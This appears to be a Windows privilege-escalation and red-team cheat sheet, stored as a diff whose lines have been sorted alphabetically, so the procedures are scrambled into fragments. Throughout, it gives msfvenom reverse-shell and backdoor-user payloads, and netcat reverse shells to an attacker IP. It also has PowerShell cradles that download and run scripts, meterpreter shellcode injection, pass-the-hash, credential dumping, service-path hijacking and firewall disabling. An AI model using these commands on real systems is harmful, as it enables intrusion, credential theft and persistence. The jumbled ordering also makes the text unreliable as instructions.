@@ -1,0 +1,614 @@
+    int i
+    return 0
+ /accepteula
+ /t /e /g domainname
+ Apply Pass-the-hash
+ Basic C code to add kalisa user to the administrator group 
+ Change password of a user
+ Check for possible exploits with the script
+ Check if these 2 registry value is 1
+ Check if you can write on this directory (see Everyone:(CI) (F) which means write permission for everyone)
+ Compile python scripts to executables:
+ Compile windows exploit 
+ Compile windows exploit (for 32 bit)
+ Create a directory for your ftp-files (you can also specify a specific user e.g.: /root/ftphome/bob).
+ Create a payload (one of them given below can be used)
+ Create folder/directory
+ Create the DLL malicious file
+ Current username
+ Definitions
+ Delete file
+ Display Help of <cmdlet>
+ Dump the hashes in the affected system running:
+ Find writeable registry keys for services using Accesschk
+ Firewall info
+ Ftp is generally installed on Windows machines
+ GPP
+ If you have your ps1 file downloaded to the victim machine then run using this
+ Inject payload into the current PowerShell process
+ Kill a task
+ List open connections
+ List scheduled tasks
+ List the cmdlets for the module PKI
+ List users
+ List windows services
+ Lists all cmdlets
+ MS10-015 (KiTrap0D)
+ MS10-092 (Task Scheduler)
+ MS11-046 (AFD.sys)
+ MS11-062 (NDISTAPI)
+ MS11-080 (AFD.sys)
+ MS13-005 (Kernel Mode Driver)
+ MS14-002 (NDProxy)
+ MS14-002 (Windows Kernel)
+ MS14-040 (AFD Driver)
+ MS14-058 (Win32k.sys)
+ MS15-010 (Kernel Driver)
+ MS15-051 (Windows Kernel Mode Drivers)
+ MS15-061 (Kernel Driver)
+ MS15-076 (RPC)
+ MS16-016 (WebDAV)
+ MS16-032 (Secondary Logon Handle)
+ MS16-075 (Hot Potato)
+ MS16-135 (Windows Kernel Mode Drivers)
+ Metasploit module
+ Metasploit module for exploitation:
+ Metasploit module to discover credentials via unattended installations
+ Metasploit module to identify missing patches
+ NBNS spoofing 
+ NTLM relay 
+ Needs admin on local computer
+ Network information
+ On Kali install a ftp client and set a username/password
+ On Windows
+ Other logged in Users
+ Permissions on a folder recursively
+ Powershell download a file
+ Process Example
+ Receive the results
+ Reverse Shell
+ Running Tasks
+ Running script as a job
+ Select-String <string>
+ Server 2012
+ Set-ExecutionPolicy Bypass -force
+ Show hidden files 
+ Start a process
+ Stop a process
+ To be Continued
+ Update the ftp database after adding our new user.
+ Upload nc.exe on the box
+ Upload the malicious exe and replace as the original one
+ Use exploit/multi/handler and get an admin shell on metasploit
+ Using the tool Remote DLL Injector from SecurityXploded (use command tasklist to check process ids)
+ WINDOWS Exploits
+ Windows XP and Win 2003 contain tftp client. Windows 7 do not by default 
+ Windows hash format:
+ account would become available
+ add a new user
+ add a user
+ add a user to admin group
+ arp -a
+ asp
+ cd C:
+ certutil
+ change execution policy 
+ change image path
+ change ownership of the specified ftp directory (and all it's sub-direcotries) 
+ change start option as AUTO-START 
+ check for ip address of domain controller
+ check for the found services above if they have write permissions
+ check if nt authority
+ check query value
+ check the status of the service now
+ command to add user to admin group
+ compile C
+ compile the C code
+ copy the systeminfo output from the low priilege shell in a file in your own server
+ create a group
+ create new PSDrives
+ decrypt the password found
+ define variable
+ delete file
+ disable firewall
+ download PowerUp.ps1 and check for vulnerabilities
+ edit/create/rename values in registry
+ enable RDP access
+ encode the executable
+ execute 2 commands
+ execute your file on victim
+ exploit.cpp -o exploit.exe
+ find passwords stored in registry
+ find the affected paths manually
+ find the full path for the important files
+ findstr KB1234567
+ first add the target machine as trusted host on your machine. Then check it and use Remoting
+ first upload nc.exe to a writable directory
+ go to z: drive
+ grep files
+ hostname
+ impersonate token
+ implementation of a fake WPAD proxy server which is running locally on the target host
+ info about a user
+ inject into another process
+ install ftp client
+ jsp
+ list available modules
+ list subkeys of a key
+ list subkeys of a key recursively
+ list the details of registry key
+ list_tokens -g command can also be used
+ listen on port 9988 and you'll get a shell with NT AUTHORITY
+ map share to a drive
+ meterpreter
+ meterpreter commands
+ missing patches
+ now check the user again
+ now mount it
+ on Kali
+ on Windows
+ on meterpreter session
+ or add the user to the admin group
+ or the following
+ or use metasploit module
+ or you can do the same steps by adding an admin user by creating the following executable 
+ other useful commands of incognito
+ php
+ powershell -noprofile -
+ powershell and wget
+ psexec using found credentials
+ pth-winexe -U user%  //$ip cmd
+ python windows exploit suggester using systeminfo output
+ restart Pure-FTPD
+ restart the service and the custom payload will be executed instead of the service binary and it will 
+ return back a Meterpreter session as SYSTEM.
+ returns an object
+ route print 
+ run an exploit on cmd.exe
+ run command through smb when user/password is known
+ run on Powershell
+ search for Groups.xml files
+ search for all intalled patches
+ search for specific patches
+ send the sherlock.ps1 file to low privileged shell and run it
+ set up exploit/multi/handler on metasploit
+ setting the location to Registry ROOT
+ setup a Multi Handler exploit and wait for a shell
+ show file contents
+ similar to grep or findstr
+ similar to type or cat
+ stores users' passwords in a hashed format (in LM hash and NTLM hash).
+ syntax
+ the token for the 
+ update the database and copy the db file name in the output
+ upload accesschk.exe to a writable directory first 
+ upload nc.exe to writable directory and change the config of service
+ view values of registry keys
+ war
+ who is the domain controller
+ whoami
+ {Import-Module .
+"    i = system(""net localgroup administrators kalisa /add"")"
+" ""man""-pages in windows"
+" Create a ftp-user, in our example ""bob"" (again you can set ""-d /root/ftphome/bob/"" if you wish)."
+" Find-AllVulns"""
+" Find-AllVulns}"""
+" For XP SP0,  version 5.2 of accesschk.exe is needed (https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe )"
+" Get the Id, Name, CPU info of a process"
+" If you get access to a machine, look for Disconnected Remoting Sessions, you may get access to whole lot of new machines. "
+" In a trusted domain, you have target/global admin credentials."
+" In a trusted domain, you have target/global admin shell."
+" Invoke-AllChecks"""
+" Invoke-AllChecks}"""
+" Lists all Alias, Function, cmdlets"
+" OS version, architecture, installed patches"
+" Run commands and scripts on remote computer(s), in disconnected sessions (v3), as background job and more. "
+" Select-String ""remoting"""
+" To make it interactive, use -s option"
+" To/From a computer not part of a trusted domain, you have target/global admin credentials. "
+" To/From a computer not part of a trusted domain, you have target/global admin shell."
+" Windows 7, 8, 10, Server 2008 and 2012 affected"
+" after credentials are found, use Psexec module"
+" check for services with weak permissions, (list all the services that an authenticated user can modify.)"
+" discover files that contain the keyword ""password"" in the following extensions"
+" download Code Execution PowerShell script ""Invoke-ShellCode"""
+" find the keyword ""password"" in all files"
+" if yes, create malicious file"
+" many other DLL Injects are available on Github, check one of them if you want"
+" or use following command (/t: type, /v:value or name of entry, /f: add without prompting for confirmation, /d: data)"
+" search for all .xml files for keyword ""cpassword"""
+" tfpt clients are usually non-interactive, so they could work through an obtained shell "
+"For more neat exploit table, check the following page:"
+"IEX (New-Object Net.WebClient).DownloadString(""http://<targetip>:<port>/CodeExecution/Invoke-Shellcode.ps1"")"
+"Invoke-Command -ComputerName (Get-Content <list of servers> ) -FilePath <path to script> - ArgumentList <arg1,arg2>"
+"LocalSystem"" password= """""
+"NetSetup.log (AD domain name, DC name, internal IP, DA account)"
+"Potato.exe -ip -cmd ""C:"
+"SYSTEM"""
+"Server 2003, Server 2008, 7, 8, Server 2012"
+"Server 2003, Server 2008, 7, XP"
+"Server 2003, XP"
+"Server 2008, 7"
+"Server 2008, 7,8,10 "
+"Server 2008, Vista, 7"
+"SomeSoftwareName /t REG_EXPAND_SZ /v ImagePath /d ""C:"
+"SomeSoftwareName /v ImagePath /d ""C:"
+"XP, Server 2003"
+"accesschk ""Authenticated Users"" -kwsuwq hklm"
+"accesschk.exe -uwcqv ""Authenticated Users"" "
+"churrasco -d ""net localgroup administrators <username> /add"""
+"churrasco -d ""net user /add <username> <password>"""
+"cmd.exe /K net localgroup administrators <username> /ADD"" -disable_exhaust true -disable_defender true"
+"cmd.exe"""
+"echo $file = ""powerup.ps1"" >>wget.ps1"
+"echo $url = ""http://<attackerip>/powerup.ps1"" >>wget.ps1"
+"echo $webclient.DownloadFile($url,$file) >>wget.ps1"
+"evil.exe"" /f"
+"evil.exe"""
+"findstr /i ""Auto"" "
+"findstr /i /v """""""
+"findstr /i /v ""C:"
+"findstr /spin ""password"" "
+"iis6.log (5,6 or 7)"
+"impersonate_token ""NT AUTHORTY"
+"powershell ""IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"""
+"powershell -ExecutionPolicy ByPass -command ""<command here>"""
+"powershell wget ""http://<attacker ip>:<attacker port>/<file to transfer>"" -outfile ""<file name to save as>"""
+"powershell.exe ""IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/PowerUp.ps1') "
+"powershell.exe ""IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/Sherlock.ps1') "
+"powershell.exe -ExecutionPolicy Bypass -noLogo -Command ""IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/powerup.ps1') "
+"powershell.exe -exec bypass -Command """
+"reg add ""hklm"
+"sc config ""upnphost"" binPath=""net localgroup administrators <username> /add"" "
+"sc config upnphost binpath= ""C:"
+"sc config upnphost obj= ""."
+"smbexec.py  domainName/userName:""password""@ipAddress"
+"taskkill /f /im ""Taskmgr.ex"""
+"terminal server"" /f /v fDenyTSConnections /t REG_DWORD /d 0"
+"wmic qfe get Caption,Description,HotFixID,InstalledOn "
+"wmic qfe get Caption,Description,HotFixID,InstalledOn"
+"wmic service get name,displayname,pathname,startmode "
+$<variable>
+---------------------------
+--------------------------------------
+-----------------------------------------
+-------------------------------------------
+------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------
+------------------------------------------------------------Basics-----------------------------------------
+-----------------------------------------Accessing other Registry hives-----------------------------------------
+-----------------------------------------Functions-----------------------------------------
+-----------------------------------------Invoke Command-----------------------------------------
+-----------------------------------------Modules-----------------------------------------
+-----------------------------------------PowerShell Remoting-----------------------------------------
+-----------------------------------------Process-----------------------------------------
+-----------------------------------------Registry Access with PowerShell-----------------------------------------
+-----------------------------------------Useful RedTeaming Github Directories-----------------------------------------
+-----------------------------------------Variables-----------------------------------------
+----------------------------------------PowerUp----------------------------------
+---------------------------Metasploit Local Exploit Suggester Module---------------------------
+---------------------------Powersploit---------------------------
+---------------------------Sherlock---------------------------
+---------------------------Windows-Exploit-Suggester---------------------------
+-PSProvider Registry
+.ini
+.txt
+.xml
+/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py
+/etc/init.d/pure-ftpd restart
+<DC IP address>
+<FQDN>
+<ip address>
+<username>
+> binary
+> dir /b /s 
+> dir /b /s sysprep.inf
+> dir /b /s sysprep.xml
+> dir /b /s unattend.xml
+> dir /b /s vnc.ini
+> dir /b /s web.config
+> execute -f rottenpotato.exe -cH
+> get exploit.exe
+> getuid
+> list_tokens -u
+> load incognito
+ASPNET_schema.xml
+AppEvent.Evt (Application log)
+CURRENTCONTROLSET
+Client
+Cmdlets: task based commands
+Computername <target ip> -Credential <computer name>
+Connect-PSSession
+Desktop
+Enter-PSSession 
+Enter-PSSession -Credential <computer name>
+Enter-PSSession <target ip>
+EoP%208:%20Kernel%20vulnerabilities
+Export-ModuleMember
+FTP (pureftpd client on Kali)
+FTP (pyftpdlib client on Kali)
+For exploit sources: https://github.com/SecWiki/windows-kernel-exploits/
+Get-<something> 
+Get-ChildItem
+Get-ChildItem -Recurse
+Get-Command
+Get-Command -CommandType cmdlet
+Get-Command -Module PKI
+Get-Content -----------------------------------------
+Get-Content <file name> 
+Get-Content <filename>
+Get-Content note.txt
+Get-Content note.txt 
+Get-Help <cmdlet>
+Get-Item
+Get-Item wsman:
+Get-ItemProperty
+Get-Job
+Get-Module -ListAvailable
+Get-PSProvider
+Get-PSSession
+Get-Process  -Name <process name>
+Get-Process -Name notepad
+HKLM and HKCU are available by default
+Import_Module <modulename or modulepath>
+Inetpub
+Installer /v AlwaysInstallElevated
+Invoke-Command -ComputerName (Get-Content <list of servers> ) -FilePath <path to script> -AsJob
+Invoke-Shellcode -ProcessId <process id> -payload windows/meterpreter/reverse_https -Lhost <ip> -Lport <port> -Force
+Invoke-Shellcode -payload windows/meterpreter/reverse_https -Lhost <ip> -Lport <port> -Force
+MACHINENAME C:
+Meterpreter Shells
+Microsoft
+NT Authority
+New-Item
+New-ItemProperty
+New-PSDrive -Name <nameofpsdrive> -PSProvider Registry -Root Registry::HKEY_USERS
+Open Task Manager
+Panther
+Policies
+Possible Scenarios:
+Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
+PowerUp.ps1
+Powershell
+Powershell ISE: Editor/Scripting Environment (GUI)
+Program Files
+Receive-Job
+References:
+RegBack
+RemoteDLLInjector64.exe <process id> C:
+Rename-Item
+Rename-ItemProperty
+SAM (only really useful if you have access to the files while the machine is off)
+SOFTWARE
+SYSTEM
+SYSTEM privileges
+SYSVOL
+SecEvent.Evt (Security log)
+Server 2016
+Services
+Set-Item
+Set-Item wsman:localhost
+Set-ItemProperty
+Set-Location Registry::
+Sherlock.ps1
+SomeSoftwareName /v ImagePath
+Start Notepad.exe
+Start powershell_ise.exe
+Start-Process -FilePath notepad.exe
+Start-Process <process name>
+Start-Process Taskmgr
+Start-Process c:
+Start-Process notepad.exe
+Stop-Process -Id <process id>
+Stop-Process -Name notepad
+Stop-Process <process name>
+System
+System32
+TFTP
+TrustedHosts
+Unattended.xml
+Users
+WINDOWS
+Web.config
+Windows
+Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:
+Windows Vulnerabilities
+Windows/system32
+Windows> tftp -i 192.168.30.45 GET nc.exe
+WindowsUpdate.log
+accesschk Everyone -kwsuwq hklm
+accesschk Users -kwsuwq hklm
+accesschk hostname
+accesschk.exe -ucqv upnphost
+administrator:f
+applicationHost.config
+apt-get install pure-ftpd
+apt-get install python-pyftpdlib  
+atftpd --daemon --port 69 /tftp
+boot.ini
+cacls 
+cd C:
+certutil.exe -urlcache -split -f https://example.com/file.exe file.exe
+chimchurri.exe <attacker ip> <attacker password>
+chown -R ftpuser:ftpgroup /root/ftphome
+client
+cmd.exe
+config
+control
+currentcontrolset
+debug
+default.sav
+del /f file
+dir 
+dir /A
+dir Groups.xml /s
+drivers
+drop_token
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo %logonserver%
+echo %username%
+echo GET evil.exe >> ftp.txt
+echo IEX(New Object Net.WebClient).downloadString('http://<ip>:<port>/Sherlock.ps1') 
+echo USER username password >> ftp.txt
+echo bin >> ftp.txt
+echo bye >> ftp.txt
+echo open <attackerip> 21> ftp.txt
+eg2:
+eg: 
+elevate ms14-058 smb
+eula.txt
+evil.dll
+evil.msi
+example.exe is affected
+exploit/windows/smb/psexec
+export SMBHASH=xxx
+fgdump.exe
+findstr /S /I cpassword 
+findstr /si password 
+findstr file.txt
+ftp -s:ftp.txt
+ftp <attackerip>
+function notepad-bus{Start-Process -FilePath powershell_ise.exe}
+getuid
+gpp-decrypt <pass>
+groupadd ftpgroup
+help dir
+hostname
+hosts (dns entries)
+httperr
+httperr1.log
+https://github.com/PowerShellMafia/PowerSploit
+https://github.com/Re4son/Churrasco
+https://github.com/samratashok/nishang
+https://guif.re/windowseop
+https://media.blackhat.com/eu-13/briefings/Mittal/bh-eu-13-powershell-for-penetration-mittal-slides.pdf
+https://www.exploit-db.com/exploits/6705/
+i686-w64-mingw32-g
+i686-w64-mingw32-gcc exploit.c -lws2_32 -o exploit.exe
+i686-w64-mingw32-gcc exploit.c -o exploit.exe
+i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
+icacls example.exe
+include <stdlib.h>
+inetpub
+inetsrv
+int main () {
+ipconfig /all 
+license.rtf
+list_tokens -g
+load powershell
+localhost
+logfiles
+md folderName
+meterpreter
+mkdir /root/ftphome
+msfvenom -p windows
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+msfvenom -p windows/exec CMD='net localgroup administrators <username here> /add' -f exe > example.exe
+msfvenom -p windows/meterpreter/reverse_https LHOST= LPORT= -f exe -o evil.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > evil.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -e x86/shikata_ga_nai -o evil.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o evil.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f jsp > evil.jsp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f php > evil.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f war > evil.war
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > example.exe
+msiexec /quiet /qn /i C:
+nc -nlvp <port> -e cmd.exe
+nc -nv <IP> <port> -e cmd.exe
+nc.exe -nv <attackerip> <attacker port> -e C:
+nc.exe <attackerip> <attackerport> -e C:
+net localgroup administrators <username> /add
+net start
+net start upnphost
+net stop upnphost
+net use z: 
+net user
+net user <username>
+net user <username> <password>
+net user <username> <password> /add
+net users <username>
+netsh firewall set opmode disable
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
+netsh firewall show config
+netsh firewall show state
+netstat -aton
+networks (network settings)
+notepad-bus
+notepad.exe -WindowStyle Hidden
+nslookup nameofserver.whatever.local
+pass
+path
+policies
+post/multi/recon/local_exploit_suggester
+post/windows/gather/credentials/gpp
+post/windows/gather/enum_patches
+post/windows/gather/enum_unattend
+powershell -ExecutionPolicy ByPass -command ./test.ps1
+powershell -ExecutionPolicy ByPass -command C:
+powershell Find-MS14058
+powershell-import C:
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+psexec.exe -u <username> -p <password> 
+pth-winexe -U DOMAIN/user%hash //$ip cmd
+pure-pw mkdb
+pure-pw useradd bob -u ftpuser -g ftpgroup -d /root/ftphome/
+python -m pyftpdlib -p 21
+python windows-exploit-suggester.py --database <db file name> --systeminfo <file with systeminfo output>
+python windows-exploit-suggester.py --database <db name> --systeminfo <filename>
+python windows-exploit-suggester.py --upadte
+python windows-exploit-suggester.py --update
+qwinsta
+reg add HKLM
+reg query HKCU
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM
+reg query HKLM /f password /t REG_SZ /s
+repair
+rev2self
+reverse_tcp LHOST=<ip> LPORT=<port> -f dll > evil.dll
+sc config upnphost start= auto
+sc qc upnphost
+sc start SomeSoftwareName
+schema
+schtasks /query /fo LIST /v
+security
+security.sav
+services
+software
+software.sav
+somepath
+start the services
+steal_token PID
+sysprep
+sysprep.inf
+sysprep.xml
+system
+system token is now available
+system.sav
+system32
+systeminfo
+sysvol
+taskkill f /pid 7777
+tasklist
+tasklist /SVC
+temp
+test.ps1
+trusted_service_path
+trustedhosts -Value <target ip or name> 
+type file
+use exploit/windows/local/always_install_elevated
+user:group:id:ntlmpassword::
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+username -kwsuwq hklm
+wce32.exe -w
+wce64.exe -w
+win.ini
+windows
+wine 
+wmic service list brief
+wwwroot
